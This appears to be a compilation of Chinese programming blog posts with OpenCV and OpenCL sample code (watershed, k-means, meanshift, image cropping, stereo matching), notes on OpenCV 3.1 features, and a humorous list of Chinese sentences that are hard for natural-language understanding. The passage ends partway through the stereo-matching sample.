		glTexParameteri(GL_TEXTURE_2D,GL_TEXTURE_MIN_FILTER,GL_LINEAR);	// 线形滤波
		glTexParameteri(GL_TEXTURE_2D,GL_TEXTURE_MAG_FILTER,GL_LINEAR);	// 线形滤波
	}
	if (TextureImage[0])							// 纹理是否存在
	{
		if (TextureImage[0]->data)					// 纹理图像是否存在
		{
			free(TextureImage[0]->data);				// 释放纹理图像占用的内存
		}

		free(TextureImage[0]);						// 释放图像结构
	}
	return Status;								// 返回 Status
}
 








原文链接：https://github.com/fighting41love/hardNLU

NLU is hard!!!
一直关注刘群老师的微博，常常看见他分享的一些好玩的#自然语言理解太难了#。
遂整理了NLU实在是太难了系列语句，大家一笑无妨。这里列举了一些关于分词、实体识别、知识图谱相关的语句，按照难度从低到高排列，最高难度的放在了最后（需要强大的知识图谱哦，欢迎大家把答案开在issue里）。
难度：※※ 两颗星

来到杨过曾经生活过的地方，小龙女动情地说：“我也想过过过儿过过的生活。”
来到儿子等校车的地方，邓超对孙俪说：“我也想等等等等等过的那辆车。”
赵敏说：我也想控忌忌己不想无忌。
你也想犯范范范玮琪犯过的错吗
对叙打击是一次性行为？



《绿林俊杰》–林俊杰做错了什么？为什么要绿他


难度：※※※ 三颗星

写给卖豆芽的对联： 长长长长长长长，长长长长长长长。(solution: changzhangchangzhangchangchangzhang zhangchangzhangchangzhangzhangchang,zhangchangchangzhangchangzhangchang，zhangchangzhangchangzhangchangchang)
季姬寂，集鸡，鸡即棘鸡。棘鸡饥叽，季姬及箕稷济鸡。鸡既济，跻姬笈，季姬忌，急咭鸡，鸡急，继圾几，季姬急，即籍箕击鸡，箕疾击几伎，伎即齑，鸡叽集几基，季姬急极屐击鸡，鸡既殛，季姬激，即记《季姬击鸡记》。
石室诗士施氏，嗜狮，誓食十狮。氏时时适市视狮。十时，适十狮适市。是时，适施氏适市。施氏视是十狮，恃矢势，使是十狮逝世。氏拾是十狮尸，适石室。石室湿，氏使侍拭石室。石室拭，氏始试食是十狮尸。食时，始识是十狮尸，实十石狮尸。试释是事。《施氏食狮史》
去商店买东西一算账1001块，小王对老板说：“一块钱算了。” 老板说好的。于是小王放下一块钱就走了，老板死命追了小王五条街又要小王付了1000，小王感慨：#自然语言理解太难了# ​
“碳碳键键能能否否定定律一” ​
书《无线电法国别研究》


13. 要去见投资人，出门时，发现车钥匙下面压了一张员工的小字条，写着“老板，加油！”，瞬间感觉好有温度，当时心理就泪奔了。心里默默发誓：我一定会努力的！ 车开了15分钟后，没油了。。。

14. 他快抱不起儿子了，因为他太胖了
15. 中文里面“大胜”和“大败”意思相同，刚发现英文里面也有类似的现象：valuable和invaluable都是表示非常有价值的意思
16. How can I help you? 我能帮您什么？我怎么可以帮你！米国某酒店前台翻译机
​

一家名为“宝鸡有一群怀揣着梦想的少年相信在牛大叔的带领下会创造生命的奇迹网络科技有限公司”走红网络，该公司全名长达39个字，还是一句主谓宾齐全的句子。宝鸡工商部门表示，该公司属合法注册，但名字太长不利于刻公章开发票



“一位友好的哥谭市民” “一位友好/的哥/谭市民”



难度：※※※※ 四颗星

宝宝的经纪人睡了宝宝的宝宝，宝宝不知道宝宝的宝宝是不是宝宝的亲生的宝宝，宝宝的宝宝为什么要这样对待宝宝！宝宝真的很难过！宝宝现在最担心的是宝宝的宝宝是不是宝宝的宝宝，如果宝宝的宝宝不是宝宝的宝宝那真是吓死宝宝了。



中不不建交是受印度的影响，中不建交不受印度的影响。

难度：※※※※※ 五颗星

NLP同学接招。这玩意非得配合超强知识图谱才能解决，非单纯NLP技术搞的定



一些搞笑的

台湾朋友发的[允悲]金门那边应对海漂死猪的防疫文件及吐槽



高兴地日韩游。接连看到这样两条微博，感叹取名字太难了，#自然语言理解太难了#




于谦的父亲，是个卖参的人
叫我起床



这宣传标语，从左往右读和从右往左读意思截然相反啊


6.从小便相识，大便情更浓


一些easy的作为结尾

校长说衣服上除了校徽别别别的
过几天天天天气不好
看见西门吹雪点上了灯，叶孤城冷笑着说：“我也想吹吹吹雪吹过的灯”，然后就吹灭了灯。
今天多得谢逊出手相救，在这里我想真心感谢“谢谢谢逊大侠出手”
灭霸把美队按在地上一边摩擦一边给他洗脑，被打残的钢铁侠说：灭霸爸爸叭叭叭叭儿的在那叭叭啥呢
姑姑你估估我鼓鼓的口袋里有多少谷和菇！！
“你看到王刚了吗”“王刚刚刚刚走”
张杰陪俩女儿跳格子：俏俏我们不要跳跳跳跳过的格子啦
骑车出门差点摔跤，还好我一把把把把住了
我朋友问父亲：我大大大（大大爷）和我姑姑谁年龄大？朋友爸爸说：你大大大大！
我背有点驼，麻麻说“你的背得背背背背佳
南京市长江大桥








 
Easy OpenCL with Python

 
原文  http://www.drdobbs.com/open-source/easy-opencl-with-python/240162614
 

 
OpenCL与python联合工作：与CUDA的前景分析
http://www.opengpu.org/forum.php?mod=viewthread&tid=16571
 
如果你对python熟，可以用 PyOpenCL, 兼顾 host 端的简洁与 device 端的高效。
kernel 函数可以写在单独的 *.cl 文件里， 一句 python 命令就可以 load + build:
 prg_src = open( 'kernel_test1.cl', 'r').read()
 prg = cl.Program(ctx, prg_src).build()

 #!/usr/bin/env python

 import numpy as np
 import pyopencl as cl

 a_np = np.random.rand(50000).astype(np.float32)
 b_np = np.random.rand(50000).astype(np.float32)

 ctx = cl.create_some_context()
 queue = cl.CommandQueue(ctx)

 mf =  cl.mem_flags
 a_g = cl.Buffer(ctx, mf.READ_ONLY | mf.COPY_HOST_PTR, hostbuf=a_np)
 b_g = cl.Buffer(ctx, mf.READ_ONLY | mf.COPY_HOST_PTR, hostbuf=b_np)

 prg = cl.Program(ctx, """
         __kernel void sum(__global const float *a_g, 
                           __global const float *b_g, 
                           __global float *res_g) 
             {
                 int gid = get_global_id(0);
                 res_g[gid] = a_g[gid] + b_g[gid];
             }
             """).build()

 res_g = cl.Buffer(ctx, mf.WRITE_ONLY, a_np.nbytes)
 prg.sum(queue, a_np.shape, None, a_g, b_g, res_g)

 res_np = np.empty_like(a_np)
 cl.enqueue_copy(queue, res_np, res_g)

 # Check on CPU with Numpy:
 print(res_np - (a_np + b_np))
 print(np.linalg.norm(res_np - (a_np + b_np)))

 
GPGPU OpenCL/CUDA 高性能编程的10大注意事项
 
http://www.cnblogs.com/xudong-bupt/p/3630952.html
 
从零开始学习OpenCL开发（一）架构 
 
http://blog.csdn.net/leonwei/article/details/8880012
 
在Android上使用OpenCL调用GPU加速 
http://blog.csdn.net/dj0379/article/details/39484061
 






// watershed_test20140801.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

//
// ch9_watershed image
//   This is an exact copy of the watershed.cpp demo in the OpenCV ../samples/c directory
//
// Think about using a morphologically eroded forground and background segmented image as the template
// for the watershed algorithm to segment objects by color and edges for collecting 
//
/* *************** License:**************************
   Oct. 3, 2008
   Right to use this code in any way you want without warrenty, support or any guarentee of it working.

   BOOK: It would be nice if you cited it:
   Learning OpenCV: Computer Vision with the OpenCV Library
     by Gary Bradski and Adrian Kaehler
     Published by O'Reilly Media, October 3, 2008
 
   AVAILABLE AT: 
     http://www.amazon.com/Learning-OpenCV-Computer-Vision-Library/dp/0596516134
     Or: http://oreilly.com/catalog/9780596516130/
     ISBN-10: 0596516134 or: ISBN-13: 978-0596516130    

   OTHER OPENCV SITES:
   * The source code is on sourceforge at:
     http://sourceforge.net/projects/opencvlibrary/
   * The OpenCV wiki page (As of Oct 1, 2008 this is down for changing over servers, but should come back):
     http://opencvlibrary.sourceforge.net/
   * An active user group is at:
     http://tech.groups.yahoo.com/group/OpenCV/
   * The minutes of weekly OpenCV development meetings are at:
     http://pr.willowgarage.com/wiki/OpenCV
   ************************************************** */

#include "cv.h"
#include "highgui.h"
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
using namespace std;


IplImage* marker_mask = 0;
IplImage* markers = 0;
IplImage* img0 = 0, *img = 0, *img_gray = 0, *wshed = 0;
CvPoint prev_pt = {-1,-1};

void on_mouse( int event, int x, int y, int flags, void* param )
{
    if( !img )
        return;

    if( event == CV_EVENT_LBUTTONUP || !(flags & CV_EVENT_FLAG_LBUTTON) )
        prev_pt = cvPoint(-1,-1);
    else if( event == CV_EVENT_LBUTTONDOWN )
        prev_pt = cvPoint(x,y);
    else if( event == CV_EVENT_MOUSEMOVE && (flags & CV_EVENT_FLAG_LBUTTON) )
    {
        CvPoint pt = cvPoint(x,y);
        if( prev_pt.x < 0 )
            prev_pt = pt;
        cvLine( marker_mask, prev_pt, pt, cvScalarAll(255), 5, 8, 0 );
        cvLine( img, prev_pt, pt, cvScalarAll(255), 5, 8, 0 );
        prev_pt = pt;
        cvShowImage( "image", img );
    }
}


int main( int argc, char** argv )
{
    cout<<"input image name:  "<<endl; 
	string file;
	cin>>file;


	char* filename = (char *)file.c_str();

    CvRNG rng = cvRNG(-1);

    if( (img0 = cvLoadImage(filename,1)) == 0 )
        return 0;

    printf( "Hot keys: \n"
            "\tESC - quit the program\n"
            "\tr - restore the original image\n"
            "\tw or ENTER - run watershed algorithm\n"
            "\t\t(before running it, roughly mark the areas on the image)\n"
            "\t  (before that, roughly outline several markers on the image)\n" );
    
    cvNamedWindow( "image", 1 );
    cvNamedWindow( "watershed transform", 1 );

    img = cvCloneImage( img0 );
    img_gray = cvCloneImage( img0 );
    wshed = cvCloneImage( img0 );
    marker_mask = cvCreateImage( cvGetSize(img), 8, 1 );
    markers = cvCreateImage( cvGetSize(img), IPL_DEPTH_32S, 1 );
    cvCvtColor( img, marker_mask, CV_BGR2GRAY );
    cvCvtColor( marker_mask, img_gray, CV_GRAY2BGR );

    cvZero( marker_mask );
    cvZero( wshed );
    cvShowImage( "image", img );
    cvShowImage( "watershed transform", wshed );
    cvSetMouseCallback( "image", on_mouse, 0 );

    for(;;)
    {
        int c = cvWaitKey(0);

        if( (char)c == 27 )
            break;

        if( (char)c == 'r' )
        {
            cvZero( marker_mask );
            cvCopy( img0, img );
            cvShowImage( "image", img );
        }

        if( (char)c == 'w' || (char)c == '\n' )
        {
            CvMemStorage* storage = cvCreateMemStorage(0);
            CvSeq* contours = 0;
            CvMat* color_tab;
            int i, j, comp_count = 0;
            //cvSaveImage( "wshed_mask.png", marker_mask );
            //marker_mask = cvLoadImage( "wshed_mask.png", 0 );
            cvFindContours( marker_mask, storage, &contours, sizeof(CvContour),
                            CV_RETR_CCOMP, CV_CHAIN_APPROX_SIMPLE );
            cvZero( markers );
            for( ; contours != 0; contours = contours->h_next, comp_count++ )
            {
                cvDrawContours( markers, contours, cvScalarAll(comp_count+1),
                                cvScalarAll(comp_count+1), -1, -1, 8, cvPoint(0,0) );
            }

            color_tab = cvCreateMat( 1, comp_count, CV_8UC3 );
            for( i = 0; i < comp_count; i++ )
            {
                uchar* ptr = color_tab->data.ptr + i*3;
                ptr[0] = (uchar)(cvRandInt(&rng)%180 + 50);
                ptr[1] = (uchar)(cvRandInt(&rng)%180 + 50);
                ptr[2] = (uchar)(cvRandInt(&rng)%180 + 50);
            }

            {
            double t = (double)cvGetTickCount();
            cvWatershed( img0, markers );
            t = (double)cvGetTickCount() - t;
            printf( "exec time = %gms\n", t/(cvGetTickFrequency()*1000.) );
            }

            // paint the watershed image
            for( i = 0; i < markers->height; i++ )
                for( j = 0; j < markers->width; j++ )
                {
                    int idx = CV_IMAGE_ELEM( markers, int, i, j );
                    uchar* dst = &CV_IMAGE_ELEM( wshed, uchar, i, j*3 );
                    if( idx == -1 )
                        dst[0] = dst[1] = dst[2] = (uchar)255;
                    else if( idx <= 0 || idx > comp_count )
                        dst[0] = dst[1] = dst[2] = (uchar)0; // should not get here
                    else
                    {
                        uchar* ptr = color_tab->data.ptr + (idx-1)*3;
                        dst[0] = ptr[0]; dst[1] = ptr[1]; dst[2] = ptr[2];
                    }
                }

            cvAddWeighted( wshed, 0.5, img_gray, 0.5, 0, wshed );
            cvShowImage( "watershed transform", wshed );
            cvReleaseMemStorage( &storage );
            cvReleaseMat( &color_tab );
        }
    }

    return 1;
}

 





﻿﻿
摘要
 
     OpenCV现在更新到了3.1版本，相对OpenCV2有了很大改进，其中对于硬件加速，移动开发（IOS，android）的支持成为亮点。
     新版的OpenCV采用了内核+插件的架构模式，整体上更加易于扩展。
     其中最与时俱进的特点就是 支持最新的 Windows 和 OS X 操作系统和最新的开发工具 (VS2015 和 Xcode 7)，支持 Andorid 5。软件的更新换代推动硬件更新，并进一步推动摩尔定律，相信OpenCV的新版会带动更多人更新Win10，vs2015等等革命性的产品，同时购买可以并行加速的N卡，在软硬件层面获取性能的提升从而产出科研成果或者优秀的应用。

（一）google编程之夏
 
OpenCV基础库的更新：得益于google summer of code更新了一大批有意思的项目

google编程之夏的介绍：https://linuxtoy.org/archives/mentor-in-google-summer-of-code-1.html




Omnidirectional Cameras Calibration and Stereo 3D Reconstruction – opencv_contrib/ccalib module (Baisheng Lai, Bo Li)Structure From Motion – opencv_contrib/sfm module (Edgar Riba, Vincent Rabaud)Improved Deformable Part-based Models – opencv_contrib/dpm module (Jiaolong Xu, Bence Magyar)Real-time Multi-object Tracking using Kernelized Correlation Filter – opencv_contrib/tracking module (Laksono Kurnianggoro, Fernando J. Iglesias Garcia)Improved and expanded Scene Text Detection – opencv_contrib/text module (Lluis Gomez, Vadim Pisarevsky)Stereo correspondence improvements – opencv_contrib/stereo module (Mircea Paul Muresan, Sergei Nosov)Structured-Light System Calibration – opencv_contrib/structured_light (Roberta Ravanelli, Delia Passalacqua, Stefano Fabri, Claudia Rapuano)Chessboard+ArUco for camera calibration – opencv_contrib/aruco (Sergio Garrido, Prasanna, Gary Bradski)Implementation of universal interface for deep neural network frameworks – opencv_contrib/dnn module (Vitaliy Lyudvichenko, Anatoly Baksheev)Recent advances in edge-aware filtering, improved SGBM stereo algorithm – opencv/calib3d and opencv_contrib/ximgproc (Alexander Bokov, Maksim Shabunin)Improved ICF detector, waldboost implementation – opencv_contrib/xobjdetect (Vlad Shakhuro, Alexander Bovyrin)Multi-target TLD tracking – opencv_contrib/tracking module (Vladimir Tyan, Antonella Cascitelli)3D pose estimation using CNNs – opencv_contrib/cnn_3dobj (Yida Wang, Manuele Tamburrano, Stefano Fabri)


 
（二）社区的贡献

社区的贡献我说几个我觉的比较有意思的：

1.RGD-D格式图像的支持，众所周知这是现在三维重建领域的一大热门，带有深度信息的图像极大方便了三维重建步骤，相当于直接能够重建点云。

2.cvpr历来是比较注重工程领域的应用，本次加入了cvpr2015的一篇新论文，可谓与时俱进，我们用上OpenCV就用上了最前沿的科研成果。（这篇是机器学习的相关内容）

3.更新了python3的相关内容，使用python3重写了python的一些接口

（三）其他一些改进
 
1.IOS的更新，从2.4.3版本开始支持ios
主要调用的是oc接口

http://docs.opencv.org/3.1.0/d3/dc9/tutorial_table_of_content_ios.html#gsc.tab=0

2.OpenCL（感觉这个比cuda靠谱）

3.Intel芯片在性能上的提升

4.硬件加速层：HAL (Hardware Acceleration Layer)，封装了一些常用矩阵加减法的硬件加速实现。后序3.2版本在这块会有比较大的改进，毕竟要用加速就得重新编译比较复杂。

5.贡献了一个直接使用OpenCV处理图像的gui接口（应该说是程序更准确），如果你只是想处理一下图片不想写代码这个正好满足你的需求

http://www.tsdconseil.fr/log/opencv/demo/index-en.html

 

（四）3.0版本的主要更新
 
1.直接集成了cuda模块
 
    cuda模块的介绍：

http://docs.opencv.org/3.0-last-rst/modules/cuda/doc/introduction.html

看了一下文档，这玩意还得用cmake重新编译才能用，拉倒吧，老夫编译一次几个小时，各种附加依赖库错误层出不穷，有那gpu加速的那点时间，要么直接用cuda重写了，要么串行也算出来了。为啥就不能只能点，检测到是N卡加几个dll或者配置一下直接跑呢，还请过来人指点迷津。


2.配置上更加方便




 
3.架构的改进
体会一下插件加扩展的架构




 
参考文献
OpenCV git上面的更新日志：

https://github.com/Itseez/opencv/wiki/ChangeLog

《OpenCV3编程入门》----感觉好像没介绍多少有关3的新特性，确实是入门书

http://zhuanlan.zhihu.com/hacker-and-painter/19988205







代码为转载，出处找不到了，不贴了

 
工具条进度条：
// ConvertColor.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include <iostream>
#include <opencv2/highgui/highgui.hpp>
#include <opencv2/imgproc/imgproc.hpp>

#pragma comment(lib,"opencv_core2410d.lib")            
#pragma comment(lib,"opencv_highgui2410d.lib")            
#pragma comment(lib,"opencv_imgproc2410d.lib")  

using namespace std;
using namespace cv;
// Global variables
const int slider_max = 100;
int slider;
Mat img;
// Callback function for trackbar event
void on_trackbar(int pos, void *)
{
	Mat img_converted;
	if(pos > 0) cvtColor(img, img_converted, CV_RGB2GRAY);
	else img_converted = img;
	imshow("Trackbar app", img_converted);
}
int main()
{
	img = imread("swan.jpg");
	namedWindow("Trackbar app");
	imshow("Trackbar app", img);
	slider = 0;
	createTrackbar("RGB <-> Grayscale", "Trackbar app", &slider, slider_max, on_trackbar);
	while(char(waitKey(1)) != 'q') {}
	return 0;
}
 
效果：
 

 
 
 
图像裁切代码：
 
// ConvertColor.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include <iostream>
#include <opencv2/highgui/highgui.hpp>
#include <opencv2/imgproc/imgproc.hpp>

#pragma comment(lib,"opencv_core2410d.lib")            
#pragma comment(lib,"opencv_highgui2410d.lib")            
#pragma comment(lib,"opencv_imgproc2410d.lib")  

using namespace std;
using namespace cv;
// Global variables
// Flags updated according to left mouse button activity
bool ldown = false, lup = false;
// Original image
Mat img;
// Starting and ending points of the user's selection
Point corner1, corner2;
// ROI
Rect box;
// Callback function for mouse events
static void mouse_callback(int event, int x, int y, int, void *)
{
	// When the left mouse button is pressed, record its position and save it in corner1
	if(event == EVENT_LBUTTONDOWN)
	{
		ldown = true;
		corner1.x = x;
		corner1.y = y;
		cout << "Corner 1 recorded at " << corner1 << endl;
	}
	// When the left mouse button is released, record its position and save it in corner2
	if(event == EVENT_LBUTTONUP)
	{
		// Also check if user selection is bigger than 20 pixels (jut for fun!)
		if(abs(x - corner1.x) > 20 && abs(y - corner1.y) > 20)
		{
			lup = true;
			corner2.x = x;
			corner2.y = y;
			cout << "Corner 2 recorded at " << corner2 << endl << endl;
		}
		else
		{
			cout << "Please select a bigger region" << endl;
			ldown = false;
		}
	}
	// Update the box showing the selected region as the user drags the mouse
	if(ldown == true && lup == false)
	{
		Point pt;
		pt.x = x;
		pt.y = y;
		Mat local_img = img.clone();
		rectangle(local_img, corner1, pt, Scalar(0, 0, 255));
		imshow("Cropping app", local_img);
	}
	// Define ROI and crop it out when both corners have been selected
	if(ldown == true && lup == true)
	{
		box.width = abs(corner1.x - corner2.x);
		box.height = abs(corner1.y - corner2.y);
		box.x = min(corner1.x, corner2.x);
		box.y = min(corner1.y, corner2.y);
		// Make an image out of just the selected ROI and display it in a new window
		Mat crop(img, box);
		namedWindow("Crop");
		imshow("Crop", crop);
		ldown = false;
		lup = false;
	}
}
int main()
{
	img = imread("swan.jpg");
	namedWindow("Cropping app");
	imshow("Cropping app", img);
	// Set the mouse event callback function
	setMouseCallback("Cropping app", mouse_callback);
	// Exit by pressing 'q'
	while(char(waitKey(1)) != 'q') {}
	return 0;
}
 
 
裁切效果：
 







 
 
 
代码：出处忘了
 
//
// Example 13-1. Using K-means
//
//
/* *************** License:**************************
   Oct. 3, 2008
   Right to use this code in any way you want without warrenty, support or any guarentee of it working.

   BOOK: It would be nice if you cited it:
   Learning OpenCV: Computer Vision with the OpenCV Library
     by Gary Bradski and Adrian Kaehler
     Published by O'Reilly Media, October 3, 2008
 
   AVAILABLE AT: 
     http://www.amazon.com/Learning-OpenCV-Computer-Vision-Library/dp/0596516134
     Or: http://oreilly.com/catalog/9780596516130/
     ISBN-10: 0596516134 or: ISBN-13: 978-0596516130    

   OTHER OPENCV SITES:
   * The source code is on sourceforge at:
     http://sourceforge.net/projects/opencvlibrary/
   * The OpenCV wiki page (As of Oct 1, 2008 this is down for changing over servers, but should come back):
     http://opencvlibrary.sourceforge.net/
   * An active user group is at:
     http://tech.groups.yahoo.com/group/OpenCV/
   * The minutes of weekly OpenCV development meetings are at:
     http://pr.willowgarage.com/wiki/OpenCV
   ************************************************** */

#include "cxcore.h"
#include "highgui.h"

#pragma comment(lib,"opencv_core2410d.lib")
#pragma comment(lib,"opencv_highgui2410d.lib")
#pragma comment(lib,"opencv_ml2410d.lib")

int main( int argc, char** argv )
{
    #define MAX_CLUSTERS 5			 //最大聚类数
    CvScalar color_tab[MAX_CLUSTERS];
    IplImage* img = cvCreateImage( cvSize( 500, 500 ), 8, 3 );
    CvRNG rng = cvRNG(0xffffffff);
    
    color_tab[0] = CV_RGB(255,0,0);
    color_tab[1] = CV_RGB(0,255,0);
    color_tab[2] = CV_RGB(100,100,255);
    color_tab[3] = CV_RGB(255,0,255);
    color_tab[4] = CV_RGB(255,255,0);

    cvNamedWindow( "clusters", 1 );

    for(;;)
    {
        int k, cluster_count = cvRandInt(&rng)%MAX_CLUSTERS + 1;
        int i, sample_count = cvRandInt(&rng)%1000 + 1;
        CvMat* points = cvCreateMat( sample_count, 1, CV_32FC2 );
        CvMat* clusters = cvCreateMat( sample_count, 1, CV_32SC1 );

        /* generate random sample from multivariate 
           Gaussian distribution */
        for( k = 0; k < cluster_count; k++ )
        {
            CvPoint center;
            CvMat point_chunk;
            center.x = cvRandInt(&rng)%img->width;
            center.y = cvRandInt(&rng)%img->height;


            cvGetRows( points, &point_chunk, 
                       k*sample_count/cluster_count,
                       k == cluster_count - 1 ? sample_count :  
                       (k+1)*sample_count/cluster_count );


            cvRandArr( &rng, &point_chunk, CV_RAND_NORMAL,
                       cvScalar(center.x,center.y,0,0),
                       cvScalar(img->width/6, img->height/6,0,0) );
        }

        /* shuffle samples */
        for( i = 0; i < sample_count/2; i++ )
        {
            CvPoint2D32f* pt1 = (CvPoint2D32f*)points->data.fl +
                                 cvRandInt(&rng)%sample_count;
            CvPoint2D32f* pt2 = (CvPoint2D32f*)points->data.fl + 
                                 cvRandInt(&rng)%sample_count;
            CvPoint2D32f temp;
            CV_SWAP( *pt1, *pt2, temp );
        }

        cvKMeans2( points, cluster_count, clusters,
                   cvTermCriteria( CV_TERMCRIT_EPS+CV_TERMCRIT_ITER, 
                                   10, 1.0 ));
        cvZero( img );
        for( i = 0; i < sample_count; i++ )
        {
            CvPoint2D32f pt = ((CvPoint2D32f*)points->data.fl)[i];
            int cluster_idx = clusters->data.i[i];
            cvCircle( img, cvPointFrom32f(pt), 2, 
                      color_tab[cluster_idx], CV_FILLED );
        }

        cvReleaseMat( &points );
        cvReleaseMat( &clusters );

        cvShowImage( "clusters", img );

        int key = cvWaitKey(0);
        if( key == 27 ) // 'ESC'
            break;
    }
}


 
 
 
 






 
 
参考：这个帖子的主要代码有错误，根据回帖改了一些
http://www.cnblogs.com/tornadomeet/archive/2012/06/06/2538695.html
 
// meanshift.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
// meanshift_segmentation.cpp : 定义控制台应用程序的入口点。
//

#include <opencv2/core/core.hpp>
#include <opencv2/highgui/highgui.hpp>
#include <opencv2/imgproc/imgproc.hpp>
#include <iostream>

#pragma comment(lib,"opencv_highgui2410d.lib")
#pragma comment(lib,"opencv_core2410d.lib")
#pragma comment(lib,"opencv_imgproc2410d.lib")

using namespace cv;
using namespace std;


Mat src,dst;

int spatialRad=10,colorRad=10,maxPryLevel=1;

//const Scalar& colorDiff=Scalar::all(1);

 

void meanshift_seg()

{

    ////调用meanshift图像金字塔进行分割

    pyrMeanShiftFiltering(src,dst,spatialRad,colorRad,maxPryLevel);

    RNG rng=theRNG();

    Mat mask(dst.rows+2,dst.cols+2,CV_8UC1,Scalar::all(0));

    for(int i=0;i<dst.rows;i++)    //opencv图像等矩阵也是基于0索引

        for(int j=0;j<dst.cols;j++)

            if(mask.at<uchar>(i+1,j+1)==0)

            {

                Scalar newcolor(rng(256),rng(256),rng(256));

                floodFill(dst,mask,Point(j,i),newcolor,0,Scalar::all(1),Scalar::all(1));

            }

    imshow("dst",dst);

}

 

void meanshift_seg_s(int i,void *)

{

    spatialRad = i;

    meanshift_seg();

}

 

void meanshift_seg_c(int i,void *)

{

    colorRad = i;

    meanshift_seg();

}

 

void meanshift_seg_m(int i,void *)

{

    maxPryLevel = i;

    meanshift_seg();

}

 

int main(int argc, uchar* argv[])

{

     

    namedWindow("src",WINDOW_AUTOSIZE);

    namedWindow("dst",WINDOW_AUTOSIZE);

 

    src=imread("swan.jpg");

    CV_Assert(!src.empty());

 

    spatialRad=10;

    colorRad=10;

    maxPryLevel=1;

 

    //虽然createTrackbar函数的参数onChange函数要求其2个参数形式为onChange(int,void*)

    //但是这里是系统响应函数，在使用createTrackbar函数时，其调用的函数可以不用写参数，甚至

    //括号都不用写，但是其调用函数的实现过程中还是需要满足(int,void*)2个参数类型

    createTrackbar("spatialRad","dst",&spatialRad,80,meanshift_seg_s);

    createTrackbar("colorRad","dst",&colorRad,60,meanshift_seg_c);

    createTrackbar("maxPryLevel","dst",&maxPryLevel,5,meanshift_seg_m);

 

//    meanshift_seg(0,0);

 

    imshow("src",src);

    /*char c=(char)waitKey();

    if(27==c)

        return 0;*/

    imshow("dst",src);

    imshow("flood",src);

    waitKey();//无限等待用户交互响应

//    while(1);//这里不能用while(1)的原因是需要等待用户的交互，而while(1)没有该功能。虽然2者都有无限等待的作用。

    return 0;

}

 
实现效果：

 






之前配置cuda跟opencv 的混合编程，发现只要使用的东西多半还要用opencv的代码编译一次，加上cuda的编译太浪费时间了，我看了几个博客，觉的opencl这个可能会比较好整，就把opencv里面的opencl代码的部分编译了一下，这个比较少，用的时候也能直接检测出来i7 自带的集成显卡：
Device name:Intel(R) HD Graphics 4600
 
后面调试程序时候发现，2.4.4版本好像还没有直接能用的dll，2.4.10的build文件夹中就有可以直接调用的现成dll也不用编译了，很是方便！
 
参考文献：
http://blog.csdn.net/pengx17/article/details/7880642
 
参数设置：
ocl_stereo_match -l=view1.png -r=view5.png -m=BM -n=64 -o=output.jpg
 
 
 
 
// ocl_stereo_match.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include <iostream>
#include <string>
#include <sstream>
#include <iomanip>
#include <stdexcept>
#include "opencv2/ocl/ocl.hpp"
#include "opencv2/highgui/highgui.hpp"

#pragma comment(lib,"opencv_core2410d.lib")
#pragma comment(lib,"opencv_highgui2410d.lib")
#pragma comment(lib,"opencv_ocl2410d.lib")
#pragma comment(lib,"opencv_imgproc2410d.lib")

using namespace cv;
using namespace std;
using namespace ocl;


struct App
{
	App(CommandLineParser& cmd);
	void run();
	void handleKey(char key);
	void printParams() const;

	void workBegin()
	{
		work_begin = getTickCount();
	}
	void workEnd()
	{
		int64 d = getTickCount() - work_begin;
		double f = getTickFrequency();
		work_fps = f / d;
	}
	string method_str() const
	{
		switch (method)
		{
		case BM:
			return "BM";
		case BP:
			return "BP";
		case CSBP:
			return "CSBP";
		}
		return "";
	}
	string text() const
	{
		stringstream ss;
		ss << "(" << method_str() << ") FPS: " << setiosflags(ios::left)
			<< setprecision(4) << work_fps;
		return ss.str();
	}
private:
	bool running, write_once;

	Mat left_src, right_src;
	Mat left, right;
	oclMat d_left, d_right;

	StereoBM_OCL bm;
	StereoBeliefPropagation bp;
	StereoConstantSpaceBP csbp;

	int64 work_begin;
	double work_fps;

	string l_img, r_img;
	string out_img;
	enum {BM, BP, CSBP} method;
	int ndisp; // Max disparity + 1
	enum {GPU, CPU} type;
};

int main(int argc, char** argv)
{
	const char* keys =
		"{ h | help     | false                     | print help message }"
		"{ l | left     |                           | specify left image }"
		"{ r | right    |                           | specify right image }"
		"{ m | method   | BM                        | specify match method(BM/BP/CSBP) }"
		"{ n | ndisp    | 64                        | specify number of disparity levels }"
		"{ o | output   | stereo_match_output.jpg   | specify output path when input is images}";

	CommandLineParser cmd(argc, argv, keys);
	if (cmd.get<bool>("help"))
	{
		cout << "Available options:" << endl;
		cmd.printParams();
		return 0;
	}

	try
	{
		App app(cmd);
		cout << "Device name:" << cv::ocl::Context::getContext()->getDeviceInfo().deviceName << endl;

		app.run();
		getchar();
	}
	catch (const exception& e)
	{
		cout << "error: " << e.what() << endl;
	}

	return EXIT_SUCCESS;
}

App::App(CommandLineParser& cmd)
	: running(false),method(BM)
{
	cout << "stereo_match_ocl sample\n";
	cout << "\nControls:\n"
		<< "\tesc - exit\n"
		<< "\to - save output image once\n"
		<< "\tp - print current parameters\n"
		<< "\tg - convert source images into gray\n"
		<< "\tm - change stereo match method\n"
		<< "\ts - change Sobel prefiltering flag (for BM only)\n"
		<< "\t1/q - increase/decrease maximum disparity\n"
		<< "\t2/w - increase/decrease window size (for BM only)\n"
		<< "\t3/e - increase/decrease iteration count (for BP and CSBP only)\n"
		<< "\t4/r - increase/decrease level count (for BP and CSBP only)\n";

	l_img = cmd.get<string>("l");
	r_img = cmd.get<string>("r");
	string mstr = cmd.get<string>("m");
	if(mstr == "BM") method = BM;
	else if(mstr == "BP") method = BP;
	else if(mstr == "CSBP") method = CSBP;
	else cout << "unknown method!\n";
	ndisp = cmd.get<int>("n");
	out_img = cmd.get<string>("o");
	write_once = false;
}


void App::run()
{
	// Load images
	cout<<l_img;
	left_src = imread(l_img,1);//cvLoadImage(l_img.c_str());//
	right_src = imread(r_img,1);//cvLoadImage(r_img.c_str());//
	if (left_src.empty()) throw runtime_error("can't open file \"" + l_img + "\"");
	if (right_src.empty()) throw runtime_error("can't open file \"" + r_img + "\"");

	cvtColor(left_src, left, CV_BGR2GRAY);
	cvtColor(right_src, right, CV_BGR2GRAY);

	d_left.upload(left);
	d_right.upload(right);

	imshow("left", left);
	imshow("right", right);

	waitKey(0);

	// Set common parameters
	bm.ndisp = ndisp;
	bp.ndisp = ndisp;
	csbp.ndisp = ndisp;

	cout << endl;
	printParams();

